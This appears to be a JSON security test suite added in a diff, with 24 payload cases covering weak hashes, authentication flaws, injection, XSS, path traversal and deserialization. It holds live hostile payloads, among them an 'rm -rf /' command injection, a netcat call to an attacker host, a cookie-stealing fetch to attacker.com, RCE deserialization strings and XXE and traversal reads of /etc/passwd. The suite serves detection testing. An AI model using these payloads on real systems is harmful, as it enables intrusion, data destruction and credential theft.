@@ -1,0 +1,267 @@
+{
+  "metadata": {
+    "suite_id": "SECURITY-TEST-SUITE-004",
+    "title": "Security Test Suite #4: Cryptographic & Auth Vectors",
+    "version": "1.0",
+    "created": "2026-06-08T14:15:00Z",
+    "provider": "Codex CLI",
+    "total_cases": 24,
+    "categories": 6,
+    "speed_focus": true
+  },
+  "test_cases": [
+    {
+      "id": "SEC-CRYPT-001",
+      "category": "Cryptographic Failures",
+      "name": "Weak MD5 Hash Detection",
+      "payload": "5d41402abc4b2a76b9719d911017c592",
+      "test_type": "hash_strength",
+      "expected_verdict": "WEAK",
+      "severity": "HIGH",
+      "cwe": "CWE-327"
+    },
+    {
+      "id": "SEC-CRYPT-002",
+      "category": "Cryptographic Failures",
+      "name": "SHA-1 Collision Detection",
+      "payload": "da39a3ee5e6b4b0d3255bfef95601890afd80709",
+      "test_type": "hash_strength",
+      "expected_verdict": "WEAK",
+      "severity": "HIGH",
+      "cwe": "CWE-327"
+    },
+    {
+      "id": "SEC-CRYPT-003",
+      "category": "Cryptographic Failures",
+      "name": "Base64 Encoded Secrets",
+      "payload": "QVBJX0tFWT1hYjEyYzNkNGU1ZjZn",
+      "test_type": "secret_encoding",
+      "expected_verdict": "SUSPICIOUS",
+      "severity": "MEDIUM",
+      "cwe": "CWE-798"
+    },
+    {
+      "id": "SEC-CRYPT-004",
+      "category": "Cryptographic Failures",
+      "name": "Hardcoded RSA Private Key",
+      "payload": "-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA2a2rwplBCXvVUZ4/IZpWZw==\n-----END RSA PRIVATE KEY-----",
+      "test_type": "credential_exposure",
+      "expected_verdict": "CRITICAL",
+      "severity": "CRITICAL",
+      "cwe": "CWE-798"
+    },
+    {
+      "id": "SEC-AUTH-001",
+      "category": "Authentication Flaws",
+      "name": "Default Credentials Detection",
+      "payload": "admin:admin",
+      "test_type": "weak_credentials",
+      "expected_verdict": "WEAK",
+      "severity": "CRITICAL",
+      "cwe": "CWE-521"
+    },
+    {
+      "id": "SEC-AUTH-002",
+      "category": "Authentication Flaws",
+      "name": "Empty Password Check",
+      "payload": "username:",
+      "test_type": "missing_auth",
+      "expected_verdict": "CRITICAL",
+      "severity": "CRITICAL",
+      "cwe": "CWE-306"
+    },
+    {
+      "id": "SEC-AUTH-003",
+      "category": "Authentication Flaws",
+      "name": "JWT with None Algorithm",
+      "payload": "eyJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIn0.",
+      "test_type": "weak_jwt",
+      "expected_verdict": "CRITICAL",
+      "severity": "CRITICAL",
+      "cwe": "CWE-347"
+    },
+    {
+      "id": "SEC-AUTH-004",
+      "category": "Authentication Flaws",
+      "name": "Session Fixation Vector",
+      "payload": "sessionId=ABC123&user_controlled=true",
+      "test_type": "session_security",
+      "expected_verdict": "SUSPICIOUS",
+      "severity": "HIGH",
+      "cwe": "CWE-384"
+    },
+    {
+      "id": "SEC-INJECT-001",
+      "category": "Code Injection",
+      "name": "OS Command Injection",
+      "payload": "'; rm -rf /; echo 'injected",
+      "test_type": "command_injection",
+      "expected_verdict": "CRITICAL",
+      "severity": "CRITICAL",
+      "cwe": "CWE-78"
+    },
+    {
+      "id": "SEC-INJECT-002",
+      "category": "Code Injection",
+      "name": "Python Pickle Deserialization",
+      "payload": "cos\nsystem\n(S'cat /etc/passwd'\ntR.",
+      "test_type": "unsafe_deserialization",
+      "expected_verdict": "CRITICAL",
+      "severity": "CRITICAL",
+      "cwe": "CWE-502"
+    },
+    {
+      "id": "SEC-INJECT-003",
+      "category": "Code Injection",
+      "name": "JavaScript Template Injection",
+      "payload": "${7*7} ${constructor.constructor('return process')()}",
+      "test_type": "template_injection",
+      "expected_verdict": "CRITICAL",
+      "severity": "CRITICAL",
+      "cwe": "CWE-1336"
+    },
+    {
+      "id": "SEC-INJECT-004",
+      "category": "Code Injection",
+      "name": "Expression Language Injection",
+      "payload": "${Runtime.getRuntime().exec('nc attacker 4444')}",
+      "test_type": "el_injection",
+      "expected_verdict": "CRITICAL",
+      "severity": "CRITICAL",
+      "cwe": "CWE-917"
+    },
+    {
+      "id": "SEC-XSS-001",
+      "category": "Cross-Site Scripting",
+      "name": "Basic XSS Vector",
+      "payload": "<script>alert('XSS')</script>",
+      "test_type": "xss_detection",
+      "expected_verdict": "HIGH",
+      "severity": "HIGH",
+      "cwe": "CWE-79"
+    },
+    {
+      "id": "SEC-XSS-002",
+      "category": "Cross-Site Scripting",
+      "name": "DOM-based XSS",
+      "payload": "<img src=x onerror=\"fetch('http://attacker.com/?c='+document.cookie)\">",
+      "test_type": "xss_detection",
+      "expected_verdict": "CRITICAL",
+      "severity": "CRITICAL",
+      "cwe": "CWE-79"
+    },
+    {
+      "id": "SEC-XSS-003",
+      "category": "Cross-Site Scripting",
+      "name": "SVG XSS Vector",
+      "payload": "<svg/onload=\"alert('XSS')\">",
+      "test_type": "xss_detection",
+      "expected_verdict": "HIGH",
+      "severity": "HIGH",
+      "cwe": "CWE-79"
+    },
+    {
+      "id": "SEC-XSS-004",
+      "category": "Cross-Site Scripting",
+      "name": "Data URI XSS",
+      "payload": "<a href=\"data:text/html,<script>alert('XSS')</script>\">click</a>",
+      "test_type": "xss_detection",
+      "expected_verdict": "HIGH",
+      "severity": "HIGH",
+      "cwe": "CWE-79"
+    },
+    {
+      "id": "SEC-PATH-001",
+      "category": "Path Traversal",
+      "name": "Unix Path Traversal",
+      "payload": "../../../../etc/passwd",
+      "test_type": "path_traversal",
+      "expected_verdict": "HIGH",
+      "severity": "HIGH",
+      "cwe": "CWE-22"
+    },
+    {
+      "id": "SEC-PATH-002",
+      "category": "Path Traversal",
+      "name": "Windows Path Traversal",
+      "payload": "..\\..\\..\\windows\\system32\\config\\sam",
+      "test_type": "path_traversal",
+      "expected_verdict": "HIGH",
+      "severity": "HIGH",
+      "cwe": "CWE-22"
+    },
+    {
+      "id": "SEC-PATH-003",
+      "category": "Path Traversal",
+      "name": "Unicode Path Traversal",
+      "payload": "..%2f..%2f..%2fetc%2fpasswd",
+      "test_type": "path_traversal",
+      "expected_verdict": "HIGH",
+      "severity": "HIGH",
+      "cwe": "CWE-22"
+    },
+    {
+      "id": "SEC-PATH-004",
+      "category": "Path Traversal",
+      "name": "Double Encoding Traversal",
+      "payload": "..%252f..%252fetc%252fpasswd",
+      "test_type": "path_traversal",
+      "expected_verdict": "MEDIUM",
+      "severity": "MEDIUM",
+      "cwe": "CWE-22"
+    },
+    {
+      "id": "SEC-DESERIALIZATION-001",
+      "category": "Insecure Deserialization",
+      "name": "Java Serialized Object RCE",
+      "payload": "aced0005sr0x6f72672e6578616d706c652e426164436c617373",
+      "test_type": "unsafe_deserialization",
+      "expected_verdict": "CRITICAL",
+      "severity": "CRITICAL",
+      "cwe": "CWE-502"
+    },
+    {
+      "id": "SEC-DESERIALIZATION-002",
+      "category": "Insecure Deserialization",
+      "name": "PHP Unserialize RCE",
+      "payload": "O:5:\"MyObj\":2:{s:3:\"cmd\";s:10:\"system('id')\";",
+      "test_type": "unsafe_deserialization",
+      "expected_verdict": "CRITICAL",
+      "severity": "CRITICAL",
+      "cwe": "CWE-502"
+    },
+    {
+      "id": "SEC-DESERIALIZATION-003",
+      "category": "Insecure Deserialization",
+      "name": "YAML Deserialization RCE",
+      "payload": "!!python/object/apply:os.system ['whoami']",
+      "test_type": "unsafe_deserialization",
+      "expected_verdict": "CRITICAL",
+      "severity": "CRITICAL",
+      "cwe": "CWE-502"
+    },
+    {
+      "id": "SEC-DESERIALIZATION-004",
+      "category": "Insecure Deserialization",
+      "name": "XML XXE Attack",
+      "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+      "test_type": "xxe_injection",
+      "expected_verdict": "CRITICAL",
+      "severity": "CRITICAL",
+      "cwe": "CWE-611"
+    }
+  ],
+  "execution_config": {
+    "timeout_per_case_ms": 100,
+    "parallel_execution": true,
+    "batch_size": 6,
+    "retry_on_failure": false
+  },
+  "report_format": {
+    "status": "pending",
+    "completion_percent": 0,
+    "passed": 0,
+    "failed": 0,
+    "errors": []
+  }
+}
